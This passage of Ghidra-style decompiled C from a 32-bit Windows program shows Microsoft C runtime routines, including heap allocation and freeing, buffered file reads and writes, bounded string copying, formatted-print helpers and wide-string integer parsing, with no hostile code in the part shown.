    *(undefined4 *)(unaff_EBP + -4) = 0xfffffffe;
    FUN_0040af67();
    uVar2 = *(undefined4 *)(unaff_EBP + -0x1c);
  }
  return uVar2;
}



void FUN_0040af67(void)

{
  int unaff_EBP;
  
  FUN_0040d1da(*(uint *)(unaff_EBP + 8));
  return;
}



// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3

undefined4 FUN_0040af71(void)

{
  uint *puVar1;
  int *piVar2;
  int unaff_EBP;
  
  FUN_0040d634(&DAT_00420330,0xc);
  *(undefined4 *)(unaff_EBP + -0x1c) = 0;
  puVar1 = *(uint **)(unaff_EBP + 8);
  if (puVar1 <= DAT_0042579c) {
    FUN_0040e055(4);
    *(undefined4 *)(unaff_EBP + -4) = 0;
    piVar2 = FUN_0040e867(puVar1);
    *(int **)(unaff_EBP + -0x1c) = piVar2;
    *(undefined4 *)(unaff_EBP + -4) = 0xfffffffe;
    FUN_0040afb7();
  }
  return *(undefined4 *)(unaff_EBP + -0x1c);
}



void FUN_0040afb7(void)

{
  FUN_0040df7b(4);
  return;
}



LPVOID __cdecl FUN_0040afc0(uint param_1)

{
  LPVOID pvVar1;
  int iVar2;
  undefined4 *puVar3;
  uint uVar4;
  
  if (param_1 < 0xffffffe1) {
    do {
      if (DAT_00423e74 == (HANDLE)0x0) {
        FUN_0040f05f();
        FUN_0040eeb4(0x1e);
        FUN_0040ec00(0xff);
      }
      if (DAT_00425790 == 1) {
        uVar4 = param_1;
        if (param_1 == 0) {
          uVar4 = 1;
        }
LAB_0040b02f:
        pvVar1 = HeapAlloc(DAT_00423e74,0,uVar4);
      }
      else if ((DAT_00425790 != 3) || (pvVar1 = (LPVOID)FUN_0040af71(), pvVar1 == (LPVOID)0x0)) {
        uVar4 = param_1;
        if (param_1 == 0) {
          uVar4 = 1;
        }
        uVar4 = uVar4 + 0xf & 0xfffffff0;
        goto LAB_0040b02f;
      }
      if (pvVar1 != (LPVOID)0x0) {
        return pvVar1;
      }
      if (DAT_004241c8 == 0) {
        puVar3 = (undefined4 *)FUN_0040caaa();
        *puVar3 = 0xc;
        break;
      }
      iVar2 = FUN_0040f0a7(param_1);
    } while (iVar2 != 0);
    puVar3 = (undefined4 *)FUN_0040caaa();
    *puVar3 = 0xc;
  }
  else {
    FUN_0040f0a7(param_1);
    puVar3 = (undefined4 *)FUN_0040caaa();
    *puVar3 = 0xc;
  }
  return (LPVOID)0x0;
}



uint __cdecl
FUN_0040b08a(undefined (*param_1) [16],byte *param_2,uint param_3,uint param_4,byte **param_5)

{
  byte *pbVar1;
  undefined (*pauVar2) [16];
  undefined4 *puVar3;
  byte *pbVar4;
  int iVar5;
  uint uVar6;
  byte *pbVar7;
  byte *pbVar8;
  byte *pbVar9;
  byte *local_10;
  
  if ((param_3 != 0) && (param_4 != 0)) {
    if (param_1 != (undefined (*) [16])0x0) {
      if ((param_5 != (byte **)0x0) && (param_4 <= (uint)(0xffffffff / (ulonglong)param_3))) {
LAB_0040b105:
        pbVar8 = (byte *)(param_3 * param_4);
        pbVar7 = pbVar8;
        pauVar2 = param_1;
        pbVar1 = param_2;
        if (((uint)param_5[3] & 0x10c) == 0) {
          local_10 = (byte *)0x1000;
        }
        else {
          local_10 = param_5[6];
        }
joined_r0x0040b12b:
        do {
          while( true ) {
            if (pbVar7 == (byte *)0x0) {
              return param_4;
            }
            if (((uint)param_5[3] & 0x10c) == 0) break;
            pbVar4 = param_5[1];
            if (pbVar4 == (byte *)0x0) break;
            if ((int)pbVar4 < 0) {
LAB_0040b27c:
              param_5[3] = (byte *)((uint)param_5[3] | 0x20);
LAB_0040b280:
              return (uint)((int)pbVar8 - (int)pbVar7) / param_3;
            }
            pbVar9 = pbVar7;
            if (pbVar4 <= pbVar7) {
              pbVar9 = pbVar4;
            }
            if (pbVar1 < pbVar9) {
              if (param_2 != (byte *)0xffffffff) {
                FUN_0040f8c0(param_1,0,(uint)param_2);
              }
              puVar3 = (undefined4 *)FUN_0040caaa();
              *puVar3 = 0x22;
              goto LAB_0040b0c1;
            }
            FUN_0040c264(pauVar2,(uint)pbVar1,(undefined4 *)*param_5,(uint)pbVar9);
            param_5[1] = param_5[1] + -(int)pbVar9;
            *param_5 = *param_5 + (int)pbVar9;
            pbVar7 = pbVar7 + -(int)pbVar9;
            pbVar1 = pbVar1 + -(int)pbVar9;
            pauVar2 = (undefined (*) [16])(pbVar9 + (int)*pauVar2);
          }
          if (local_10 <= pbVar7) {
            if (local_10 == (byte *)0x0) {
              pbVar4 = (byte *)0x7fffffff;
              if (pbVar7 < (byte *)0x80000000) {
                pbVar4 = pbVar7;
              }
            }
            else {
              if (pbVar7 < (byte *)0x80000000) {
                uVar6 = (uint)pbVar7 % (uint)local_10;
                pbVar4 = pbVar7;
              }
              else {
                uVar6 = (uint)(0x7fffffff % ZEXT48(local_10));
                pbVar4 = (byte *)0x7fffffff;
              }
              pbVar4 = pbVar4 + -uVar6;
            }
            if (pbVar1 < pbVar4) {
LAB_0040b24f:
              if (param_2 != (byte *)0xffffffff) {
                FUN_0040f8c0(param_1,0,(uint)param_2);
              }
              puVar3 = (undefined4 *)FUN_0040caaa();
              *puVar3 = 0x22;
              goto LAB_0040b0c1;
            }
            FUN_0040dac0((int)param_5);
            iVar5 = FUN_0040f7bc();
            if (iVar5 == 0) {
              param_5[3] = (byte *)((uint)param_5[3] | 0x10);
              goto LAB_0040b280;
            }
            if (iVar5 == -1) goto LAB_0040b27c;
            pbVar7 = pbVar7 + -iVar5;
            pbVar1 = pbVar1 + -iVar5;
            pauVar2 = (undefined (*) [16])(*pauVar2 + iVar5);
            goto joined_r0x0040b12b;
          }
          uVar6 = FUN_0040f0cf(param_5);
          if (uVar6 == 0xffffffff) goto LAB_0040b280;
          if (pbVar1 == (byte *)0x0) goto LAB_0040b24f;
          (*pauVar2)[0] = (char)uVar6;
          local_10 = param_5[6];
          pbVar7 = pbVar7 + -1;
          pbVar1 = pbVar1 + -1;
          pauVar2 = (undefined (*) [16])(*pauVar2 + 1);
        } while( true );
      }
      if (param_2 != (byte *)0xffffffff) {
        FUN_0040f8c0(param_1,0,(uint)param_2);
      }
      if ((param_5 != (byte **)0x0) && (param_4 <= (uint)(0xffffffff / (ulonglong)param_3)))
      goto LAB_0040b105;
    }
    puVar3 = (undefined4 *)FUN_0040caaa();
    *puVar3 = 0x16;
LAB_0040b0c1:
    FUN_0040ca42();
  }
  return 0;
}



// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3

undefined4 FUN_0040b294(void)

{
  undefined4 *puVar1;
  uint uVar2;
  int unaff_EBP;
  
  FUN_0040d634(&DAT_00420350,0xc);
  *(undefined4 *)(unaff_EBP + -0x1c) = 0;
  if ((*(int *)(unaff_EBP + 0x10) != 0) && (*(int *)(unaff_EBP + 0x14) != 0)) {
    if (*(int *)(unaff_EBP + 0x18) != 0) {
      FUN_0040d167(*(undefined **)(unaff_EBP + 0x18));
      *(undefined4 *)(unaff_EBP + -4) = 0;
      uVar2 = FUN_0040b08a(*(undefined (**) [16])(unaff_EBP + 8),*(byte **)(unaff_EBP + 0xc),
                           *(uint *)(unaff_EBP + 0x10),*(uint *)(unaff_EBP + 0x14),
                           *(byte ***)(unaff_EBP + 0x18));
      *(uint *)(unaff_EBP + -0x1c) = uVar2;
      *(undefined4 *)(unaff_EBP + -4) = 0xfffffffe;
      FUN_0040b320();
      return *(undefined4 *)(unaff_EBP + -0x1c);
    }
    if (*(int *)(unaff_EBP + 0xc) != -1) {
      FUN_0040f8c0(*(undefined (**) [16])(unaff_EBP + 8),0,*(uint *)(unaff_EBP + 0xc));
    }
    puVar1 = (undefined4 *)FUN_0040caaa();
    *puVar1 = 0x16;
    FUN_0040ca42();
  }
  return 0;
}



void FUN_0040b320(void)

{
  int unaff_EBP;
  
  FUN_0040d1da(*(uint *)(unaff_EBP + 0x18));
  return;
}



void FUN_0040b32a(undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4)

{
  FUN_0040b294();
  return;
}



undefined4 __cdecl FUN_0040b347(int *param_1)

{
  undefined4 *puVar1;
  int iVar2;
  undefined4 uVar3;
  
  uVar3 = 0xffffffff;
  if (param_1 == (int *)0x0) {
    puVar1 = (undefined4 *)FUN_0040caaa();
    *puVar1 = 0x16;
    FUN_0040ca42();
    uVar3 = 0xffffffff;
  }
  else {
    if ((*(byte *)(param_1 + 3) & 0x83) != 0) {
      uVar3 = FUN_0040daf2(param_1);
      FUN_0040faa3(param_1);
      FUN_0040dac0((int)param_1);
      iVar2 = FUN_0040f9d6();
      if (iVar2 < 0) {
        uVar3 = 0xffffffff;
      }
      else if (param_1[7] != 0) {
        FUN_0040b61e();
        param_1[7] = 0;
      }
    }
    param_1[3] = 0;
  }
  return uVar3;
}



// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3

undefined4 FUN_0040b3be(void)

{
  int *piVar1;
  undefined4 *puVar2;
  undefined4 uVar3;
  int unaff_EBP;
  
  FUN_0040d634(&DAT_00420370,0xc);
  *(undefined4 *)(unaff_EBP + -0x1c) = 0xffffffff;
  piVar1 = *(int **)(unaff_EBP + 8);
  if (piVar1 == (int *)0x0) {
    puVar2 = (undefined4 *)FUN_0040caaa();
    *puVar2 = 0x16;
    FUN_0040ca42();
    uVar3 = 0xffffffff;
  }
  else {
    if ((*(byte *)(piVar1 + 3) & 0x40) == 0) {
      FUN_0040d167((undefined *)piVar1);
      *(undefined4 *)(unaff_EBP + -4) = 0;
      uVar3 = FUN_0040b347(piVar1);
      *(undefined4 *)(unaff_EBP + -0x1c) = uVar3;
      *(undefined4 *)(unaff_EBP + -4) = 0xfffffffe;
      FUN_0040b432();
    }
    else {
      piVar1[3] = 0;
    }
    uVar3 = *(undefined4 *)(unaff_EBP + -0x1c);
  }
  return uVar3;
}



void FUN_0040b432(void)

{
  uint unaff_ESI;
  
  FUN_0040d1da(unaff_ESI);
  return;
}



uint __cdecl FUN_0040b43a(undefined4 *param_1,uint param_2,uint param_3,int *param_4)

{
  undefined4 *puVar1;
  int iVar2;
  uint uVar3;
  uint uVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  uint local_c;
  undefined4 *local_8;
  
  if ((param_2 != 0) && (param_3 != 0)) {
    if ((param_4 != (int *)0x0) &&
       ((param_1 != (undefined4 *)0x0 && (param_3 <= (uint)(0xffffffff / (ulonglong)param_2))))) {
      uVar6 = param_2 * param_3;
      uVar5 = uVar6;
      if ((param_4[3] & 0x10cU) == 0) {
        local_c = 0x1000;
      }
      else {
        local_c = param_4[6];
      }
      do {
        while( true ) {
          if (uVar5 == 0) {
            return param_3;
          }
          if ((param_4[3] & 0x108U) == 0) break;
          uVar7 = param_4[1];
          if (uVar7 == 0) break;
          if ((int)uVar7 < 0) {
            param_4[3] = param_4[3] | 0x20;
            goto LAB_0040b587;
          }
          uVar4 = uVar5;
          if (uVar7 <= uVar5) {
            uVar4 = uVar7;
          }
          FUN_00410450((undefined4 *)*param_4,param_1,uVar4);
          param_4[1] = param_4[1] - uVar4;
          *param_4 = *param_4 + uVar4;
          uVar5 = uVar5 - uVar4;
LAB_0040b543:
          local_8 = (undefined4 *)((int)param_1 + uVar4);
          param_1 = local_8;
        }
        if (local_c <= uVar5) {
          if (((param_4[3] & 0x108U) != 0) && (iVar2 = FUN_0040daf2(param_4), iVar2 != 0))
          goto LAB_0040b587;
          uVar7 = uVar5;
          if (local_c != 0) {
            uVar7 = uVar5 - uVar5 % local_c;
          }
          FUN_0040dac0((int)param_4);
          uVar3 = FUN_0041036b();
          if (uVar3 != 0xffffffff) {
            uVar4 = uVar7;
            if (uVar3 <= uVar7) {
              uVar4 = uVar3;
            }
            uVar5 = uVar5 - uVar4;
            if (uVar7 <= uVar3) goto LAB_0040b543;
          }
          param_4[3] = param_4[3] | 0x20;
LAB_0040b587:
          return (uVar6 - uVar5) / param_2;
        }
        uVar7 = FUN_0040fad4(*(byte *)param_1,param_4);
        if (uVar7 == 0xffffffff) goto LAB_0040b587;
        param_1 = (undefined4 *)((int)param_1 + 1);
        local_c = param_4[6];
        uVar5 = uVar5 - 1;
        if ((int)local_c < 1) {
          local_c = 1;
        }
      } while( true );
    }
    puVar1 = (undefined4 *)FUN_0040caaa();
    *puVar1 = 0x16;
    FUN_0040ca42();
  }
  return 0;
}



// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3

undefined4 FUN_0040b59c(void)

{
  undefined4 *puVar1;
  uint uVar2;
  int unaff_EBP;
  
  FUN_0040d634(&DAT_00420390,0xc);
  if ((*(int *)(unaff_EBP + 0xc) != 0) && (*(int *)(unaff_EBP + 0x10) != 0)) {
    if (*(int *)(unaff_EBP + 0x14) != 0) {
      FUN_0040d167(*(undefined **)(unaff_EBP + 0x14));
      *(undefined4 *)(unaff_EBP + -4) = 0;
      uVar2 = FUN_0040b43a(*(undefined4 **)(unaff_EBP + 8),*(uint *)(unaff_EBP + 0xc),
                           *(uint *)(unaff_EBP + 0x10),*(int **)(unaff_EBP + 0x14));
      *(uint *)(unaff_EBP + -0x1c) = uVar2;
      *(undefined4 *)(unaff_EBP + -4) = 0xfffffffe;
      FUN_0040b614();
      return *(undefined4 *)(unaff_EBP + -0x1c);
    }
    puVar1 = (undefined4 *)FUN_0040caaa();
    *puVar1 = 0x16;
    FUN_0040ca42();
  }
  return 0;
}



void FUN_0040b614(void)

{
  int unaff_EBP;
  
  FUN_0040d1da(*(uint *)(unaff_EBP + 0x14));
  return;
}



// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3

void FUN_0040b61e(void)

{
  uint *puVar1;
  BOOL BVar2;
  int *piVar3;
  DWORD DVar4;
  int iVar5;
  int unaff_EBP;
  LPVOID lpMem;
  
  FUN_0040d634(&DAT_004203b0,0xc);
  lpMem = *(LPVOID *)(unaff_EBP + 8);
  if (lpMem != (LPVOID)0x0) {
    if (DAT_00425790 == 3) {
      FUN_0040e055(4);
      *(undefined4 *)(unaff_EBP + -4) = 0;
      puVar1 = (uint *)FUN_0040e088((int)lpMem);
      *(uint **)(unaff_EBP + -0x1c) = puVar1;
      if (puVar1 != (uint *)0x0) {
        FUN_0040e0b8(puVar1,(int)lpMem);
      }
      *(undefined4 *)(unaff_EBP + -4) = 0xfffffffe;
      FUN_0040b674();
      if (*(int *)(unaff_EBP + -0x1c) != 0) {
        return;
      }
      lpMem = *(LPVOID *)(unaff_EBP + 8);
    }
    BVar2 = HeapFree(DAT_00423e74,0,lpMem);
    if (BVar2 == 0) {
      piVar3 = (int *)FUN_0040caaa();
      DVar4 = GetLastError();
      iVar5 = FUN_0040ca68(DVar4);
      *piVar3 = iVar5;
    }
  }
  return;
}



void FUN_0040b674(void)

{
  FUN_0040df7b(4);
  return;
}



void FUN_0040b6ac(void)

{
  FUN_0040b61e();
  return;
}



int __cdecl
FUN_0040b6b7(undefined *param_1,undefined *param_2,uint param_3,int param_4,undefined4 param_5,
            undefined4 param_6)

{
  undefined4 *puVar1;
  int iVar2;
  uint uVar3;
  undefined *local_24;
  int local_20;
  undefined *local_1c;
  undefined4 local_18;
  
  if (param_4 == 0) {
    puVar1 = (undefined4 *)FUN_0040caaa();
    *puVar1 = 0x16;
    FUN_0040ca42();
    return -1;
  }
  if ((param_3 != 0) && (param_2 == (undefined *)0x0)) {
    puVar1 = (undefined4 *)FUN_0040caaa();
    *puVar1 = 0x16;
    FUN_0040ca42();
    return -1;
  }
  local_18 = 0x42;
  local_1c = param_2;
  local_24 = param_2;
  if (param_3 < 0x40000000) {
    local_20 = param_3 * 2;
  }
  else {
    local_20 = 0x7fffffff;
  }
  iVar2 = (*(code *)param_1)(&local_24,param_4,param_5,param_6);
  if (param_2 == (undefined *)0x0) {
    return iVar2;
  }
  if (-1 < iVar2) {
    local_20 = local_20 + -1;
    if (local_20 < 0) {
      uVar3 = FUN_0040fad4(0,(int *)&local_24);
      if (uVar3 == 0xffffffff) goto LAB_0040b79b;
    }
    else {
      *local_24 = 0;
      local_24 = local_24 + 1;
    }
    local_20 = local_20 + -1;
    if (-1 < local_20) {
      *local_24 = 0;
      return iVar2;
    }
    uVar3 = FUN_0040fad4(0,(int *)&local_24);
    if (uVar3 != 0xffffffff) {
      return iVar2;
    }
  }
LAB_0040b79b:
  *(undefined2 *)(param_2 + param_3 * 2 + -2) = 0;
  return (-1 < local_20) - 2;
}



int __cdecl
FUN_0040b7af(undefined2 *param_1,uint param_2,int param_3,undefined4 param_4,undefined4 param_5)

{
  undefined4 *puVar1;
  int iVar2;
  
  if (param_3 == 0) {
    puVar1 = (undefined4 *)FUN_0040caaa();
    *puVar1 = 0x16;
    FUN_0040ca42();
  }
  else {
    if ((param_1 == (undefined2 *)0x0) || (param_2 == 0)) {
      puVar1 = (undefined4 *)FUN_0040caaa();
      *puVar1 = 0x16;
    }
    else {
      iVar2 = FUN_0040b6b7(FUN_0041085d,(undefined *)param_1,param_2,param_3,param_4,param_5);
      if (iVar2 < 0) {
        *param_1 = 0;
      }
      if (iVar2 != -2) {
        return iVar2;
      }
      puVar1 = (undefined4 *)FUN_0040caaa();
      *puVar1 = 0x22;
    }
    FUN_0040ca42();
  }
  return -1;
}



void __cdecl FUN_0040b83a(undefined2 *param_1,uint param_2,int param_3,undefined4 param_4)

{
  FUN_0040b7af(param_1,param_2,param_3,0,param_4);
  return;
}



undefined4 * __fastcall FUN_0040b857(undefined4 *param_1)

{
  FUN_00411450(param_1,(undefined4 *)&LAB_00422000);
  *param_1 = &DAT_0041c280;
  return param_1;
}



undefined4 * __thiscall FUN_0040b87d(void *this,byte param_1)

{
  *(undefined **)this = &DAT_0041c280;
  FUN_004114ca((undefined4 *)this);
  if ((param_1 & 1) != 0) {
    FUN_0040b6ac();
  }
  return (undefined4 *)this;
}



undefined4 * __thiscall FUN_0040b8a4(void *this,int param_1)

{
  FUN_0041146d(this,param_1);
  *(undefined **)this = &DAT_0041c280;
  return (undefined4 *)this;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl FUN_0040b8c1(uint param_1)

{
  code *pcVar1;
  int iVar2;
  LPVOID pvVar3;
  undefined local_10 [12];
  
  do {
    pvVar3 = FUN_0040afc0(param_1);
    if (pvVar3 != (LPVOID)0x0) {
      return;
    }
    iVar2 = FUN_0040f0a7(param_1);
  } while (iVar2 != 0);
  if ((_DAT_004239cc & 1) == 0) {
    _DAT_004239cc = _DAT_004239cc | 1;
    FUN_0040b857((undefined4 *)&DAT_004239c0);
    FUN_00411686(&LAB_0041bc51);
  }
  FUN_0040b8a4(local_10,0x4239c0);
  __CxxThrowException_8(local_10,&DAT_004203cc);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



undefined4 * __cdecl FUN_0040b926(undefined4 *param_1,short *param_2,int param_3)

{
  short sVar1;
  uint uVar2;
  uint uVar3;
  undefined4 *puVar4;
  
  puVar4 = param_1;
  if (param_3 != 0) {
    do {
      sVar1 = *param_2;
      *(short *)puVar4 = sVar1;
      puVar4 = (undefined4 *)((int)puVar4 + 2);
      param_2 = param_2 + 1;
      if (sVar1 == 0) break;
      param_3 = param_3 + -1;
    } while (param_3 != 0);
    if ((param_3 != 0) && (uVar2 = param_3 - 1, uVar2 != 0)) {
      for (uVar3 = uVar2 >> 1; uVar3 != 0; uVar3 = uVar3 - 1) {
        *puVar4 = 0;
        puVar4 = puVar4 + 1;
      }
      for (uVar2 = (uint)((uVar2 & 1) != 0); uVar2 != 0; uVar2 = uVar2 - 1) {
        *(undefined2 *)puVar4 = 0;
        puVar4 = (undefined4 *)((int)puVar4 + 2);
      }
    }
  }
  return param_1;
}



undefined (**) [16] __thiscall FUN_0040b970(void *this,undefined (**param_1) [16])

{
  uint *puVar1;
  undefined (*pauVar2) [16];
  LONG *pLVar3;
  
  *(undefined *)((int)this + 0xc) = 0;
  if (param_1 == (undefined (**) [16])0x0) {
    pauVar2 = FUN_0040cdba();
    *(undefined (**) [16])((int)this + 8) = pauVar2;
    *(undefined4 *)this = *(undefined4 *)(pauVar2[6] + 0xc);
    *(undefined4 *)((int)this + 4) = *(undefined4 *)(pauVar2[6] + 8);
                    // WARNING: Load size is inaccurate
    if ((*this != DAT_00422d98) && ((*(uint *)pauVar2[7] & DAT_00422cb4) == 0)) {
      pauVar2 = FUN_0041207b();
      *(undefined (**) [16])this = pauVar2;
    }
    if ((*(int *)((int)this + 4) != DAT_00422bb8) &&
       ((*(uint *)(*(int *)((int)this + 8) + 0x70) & DAT_00422cb4) == 0)) {
      pLVar3 = FUN_0041190f();
      *(LONG **)((int)this + 4) = pLVar3;
    }
    if ((*(byte *)(*(int *)((int)this + 8) + 0x70) & 2) == 0) {
      puVar1 = (uint *)(*(int *)((int)this + 8) + 0x70);
      *puVar1 = *puVar1 | 2;
      *(undefined *)((int)this + 0xc) = 1;
    }
  }
  else {
    *(undefined (**) [16])this = *param_1;
    *(undefined (**) [16])((int)this + 4) = param_1[1];
  }
  return (undefined (**) [16])this;
}



undefined8 __cdecl
FUN_0040b9f7(undefined (**param_1) [16],WCHAR *param_2,WCHAR **param_3,uint param_4,uint param_5)

{
  WCHAR WVar1;
  WCHAR *pWVar2;
  ushort uVar3;
  undefined4 *puVar4;
  undefined2 extraout_var;
  int iVar5;
  uint uVar6;
  uint extraout_ECX;
  uint uVar7;
  WCHAR *pWVar8;
  undefined (*local_34 [2]) [16];
  int local_2c;
  char local_28;
  uint local_24;
  uint local_20;
  uint local_1c;
  int local_18;
  undefined8 local_14;
  undefined8 local_c;
  
  FUN_0040b970(local_34,param_1);
  if (param_3 != (WCHAR **)0x0) {
    *param_3 = param_2;
  }
  if ((param_2 == (WCHAR *)0x0) || ((param_4 != 0 && (((int)param_4 < 2 || (0x24 < (int)param_4)))))
     ) {
    puVar4 = (undefined4 *)FUN_0040caaa();
    *puVar4 = 0x16;
    FUN_0040ca42();
    if (local_28 != '\0') {
      *(uint *)(local_2c + 0x70) = *(uint *)(local_2c + 0x70) & 0xfffffffd;
    }
    local_c._0_4_ = 0;
    local_c._4_4_ = 0;
    goto LAB_0040bca7;
  }
  local_c = 0;
  WVar1 = *param_2;
  pWVar2 = param_2;
  while( true ) {
    pWVar8 = pWVar2 + 1;
    uVar3 = FUN_004122cc(WVar1,8,local_34);
    if (CONCAT22(extraout_var,uVar3) == 0) break;
    WVar1 = *pWVar8;
    pWVar2 = pWVar8;
  }
  if (WVar1 == L'-') {
    param_5 = param_5 | 2;
LAB_0040ba96:
    WVar1 = *pWVar8;
    pWVar8 = pWVar2 + 2;
  }
  else if (WVar1 == L'+') goto LAB_0040ba96;
  uVar7 = (uint)(ushort)WVar1;
  if ((((int)param_4 < 0) || (param_4 == 1)) || (0x24 < (int)param_4)) {
    if (param_3 != (WCHAR **)0x0) {
      *param_3 = param_2;
    }
    if (local_28 != '\0') {
      *(uint *)(local_2c + 0x70) = *(uint *)(local_2c + 0x70) & 0xfffffffd;
    }
    local_c._0_4_ = 0;
    local_c._4_4_ = 0;
LAB_0040bca7:
    return CONCAT44(local_c._4_4_,(uint)local_c);
  }
  if (param_4 == 0) {
    iVar5 = FUN_004120f1(WVar1);
    if (iVar5 != 0) {
      param_4 = 10;
      goto LAB_0040bb14;
    }
    if ((*pWVar8 != L'x') && (*pWVar8 != L'X')) {
      param_4 = 8;
      goto LAB_0040bb14;
    }
    param_4 = 0x10;
  }
  if (((param_4 == 0x10) && (iVar5 = FUN_004120f1(WVar1), iVar5 == 0)) &&
     ((*pWVar8 == L'x' || (*pWVar8 == L'X')))) {
    uVar7 = (uint)(ushort)pWVar8[1];
    pWVar8 = pWVar8 + 2;
  }
LAB_0040bb14:
  local_20 = (int)param_4 >> 0x1f;
  local_24 = param_4;
  local_14 = FUN_004123a0(0xffffffff,0xffffffff,param_4,local_20);
  local_18 = 0x10;
  local_1c = extraout_ECX;
  do {
    uVar3 = (ushort)uVar7;
    uVar6 = FUN_004120f1(uVar3);
    if (uVar6 == 0xffffffff) {
      if (((uVar3 < 0x41) || (0x5a < uVar3)) && (0x19 < (ushort)(uVar3 - 0x61))) break;
      if ((ushort)(uVar3 - 0x61) < 0x1a) {
        uVar7 = uVar7 - 0x20;
      }
      uVar6 = uVar7 - 0x37;
    }
    if (param_4 <= uVar6) break;
    if (((local_c._4_4_ < local_14._4_4_) ||
        ((local_c._4_4_ <= local_14._4_4_ && ((uint)local_c < (uint)local_14)))) ||
       (((uint)local_c == (uint)local_14 &&
        ((local_c._4_4_ == local_14._4_4_ && ((local_18 != 0 || (uVar6 <= local_1c)))))))) {
      local_c = FUN_00412360(local_24,local_20,(uint)local_c,local_c._4_4_);
      local_c = local_c + (ulonglong)uVar6;
      param_5 = param_5 | 8;
    }
    else {
      param_5 = param_5 | 0xc;
      if (param_3 == (WCHAR **)0x0) break;
    }
    uVar7 = (uint)(ushort)*pWVar8;
    pWVar8 = pWVar8 + 1;
  } while( true );
  pWVar8 = pWVar8 + -1;
  if ((param_5 & 8) == 0) {
    if (param_3 != (WCHAR **)0x0) {
      pWVar8 = param_2;
    }
    local_c = 0;
  }
  else if (((param_5 & 4) != 0) ||
          (((param_5 & 1) == 0 &&
           ((((param_5 & 2) != 0 &&
             ((0x80000000 < local_c._4_4_ || ((0x7fffffff < local_c._4_4_ && ((uint)local_c != 0))))
             )) || (((param_5 & 2) == 0 &&
                    ((0x7ffffffe < local_c._4_4_ && (0x7fffffff < local_c._4_4_)))))))))) {
    puVar4 = (undefined4 *)FUN_0040caaa();
    *puVar4 = 0x22;
    if ((param_5 & 1) == 0) {
      if ((param_5 & 2) == 0) {
        local_c = 0x7fffffffffffffff;
      }
      else {
        local_c = -0x8000000000000000;
      }
    }
    else {
      local_c = -1;
    }
  }
  if (param_3 != (WCHAR **)0x0) {
    *param_3 = pWVar8;
  }
  if ((param_5 & 2) != 0) {
    local_c = CONCAT44(-(local_c._4_4_ + ((uint)local_c != 0)),-(uint)local_c);
  }
  if (local_28 != '\0') {
    *(uint *)(local_2c + 0x70) = *(uint *)(local_2c + 0x70) & 0xfffffffd;
  }
  goto LAB_0040bca7;
}



undefined8 __cdecl FUN_0040bcab(WCHAR *param_1,WCHAR **param_2,uint param_3)

{
  undefined8 uVar1;
  undefined (**ppauVar2) [16];
  
  if (DAT_004241e8 == 0) {
    ppauVar2 = (undefined (**) [16])&DAT_00422da0;
  }
  else {
    ppauVar2 = (undefined (**) [16])0x0;
  }
  uVar1 = FUN_0040b9f7(ppauVar2,param_1,param_2,param_3,0);
  return uVar1;
}



undefined4 __cdecl FUN_0040bcd6(char *param_1,int param_2,char *param_3)

{
  char cVar1;
  undefined4 *puVar2;
  char *pcVar3;
  undefined4 uStack_14;
  
  if ((param_1 != (char *)0x0) && (param_2 != 0)) {
    pcVar3 = param_1;
    if (param_3 != (char *)0x0) {
      do {
        cVar1 = *param_3;
        *pcVar3 = cVar1;
        param_3 = param_3 + 1;
        if (cVar1 == '\0') break;
        param_2 = param_2 + -1;
        pcVar3 = pcVar3 + 1;
      } while (param_2 != 0);
      if (param_2 != 0) {
        return 0;
      }
      *param_1 = '\0';
      puVar2 = (undefined4 *)FUN_0040caaa();
      uStack_14 = 0x22;
      *puVar2 = 0x22;
      goto LAB_0040bcf8;
    }
    *param_1 = '\0';
  }
  puVar2 = (undefined4 *)FUN_0040caaa();
  uStack_14 = 0x16;
  *puVar2 = 0x16;
LAB_0040bcf8:
  FUN_0040ca42();
  return uStack_14;
}



int __cdecl
FUN_0040bd3e(undefined *param_1,undefined *param_2,uint param_3,int param_4,undefined4 param_5,
            undefined4 param_6)

{
  undefined4 *puVar1;
  int iVar2;
  uint uVar3;
  undefined *local_24;
  uint local_20;
  undefined *local_1c;
  undefined4 local_18;
  
  if (param_4 == 0) {
    puVar1 = (undefined4 *)FUN_0040caaa();
    *puVar1 = 0x16;
    FUN_0040ca42();
    iVar2 = -1;
  }
  else if ((param_3 == 0) || (param_2 != (undefined *)0x0)) {
    local_20 = 0x7fffffff;
    if (param_3 < 0x80000000) {
      local_20 = param_3;
    }
    local_18 = 0x42;
    local_1c = param_2;
    local_24 = param_2;
    iVar2 = (*(code *)param_1)(&local_24,param_4,param_5,param_6);
    if (param_2 != (undefined *)0x0) {
      if (-1 < iVar2) {
        local_20 = local_20 - 1;
        if (-1 < (int)local_20) {
          *local_24 = 0;
          return iVar2;
        }
        uVar3 = FUN_0040fad4(0,(int *)&local_24);
        if (uVar3 != 0xffffffff) {
          return iVar2;
        }
      }
      param_2[param_3 - 1] = 0;
      iVar2 = (-1 < (int)local_20) - 2;
    }
  }
  else {
    puVar1 = (undefined4 *)FUN_0040caaa();
    *puVar1 = 0x16;
    FUN_0040ca42();
    iVar2 = -1;
  }
  return iVar2;
}



int __cdecl
FUN_0040be0a(undefined *param_1,uint param_2,int param_3,undefined4 param_4,undefined4 param_5)

{
  undefined4 *puVar1;
  int iVar2;
  
  if (param_3 == 0) {
    puVar1 = (undefined4 *)FUN_0040caaa();
    *puVar1 = 0x16;
    FUN_0040ca42();
  }
  else {
    if ((param_1 == (undefined *)0x0) || (param_2 == 0)) {
      puVar1 = (undefined4 *)FUN_0040caaa();
      *puVar1 = 0x16;
    }
    else {
      iVar2 = FUN_0040bd3e(FUN_004124db,param_1,param_2,param_3,param_4,param_5);
      if (iVar2 < 0) {
        *param_1 = 0;
      }
      if (iVar2 != -2) {
        return iVar2;
      }
      puVar1 = (undefined4 *)FUN_0040caaa();
      *puVar1 = 0x22;
    }
    FUN_0040ca42();
  }
  return -1;
}



void __cdecl FUN_0040be92(undefined *param_1,uint param_2,int param_3,undefined4 param_4)

{
  FUN_0040be0a(param_1,param_2,param_3,0,param_4);
  return;
}



void __cdecl FUN_0040beaf(int param_1)

{
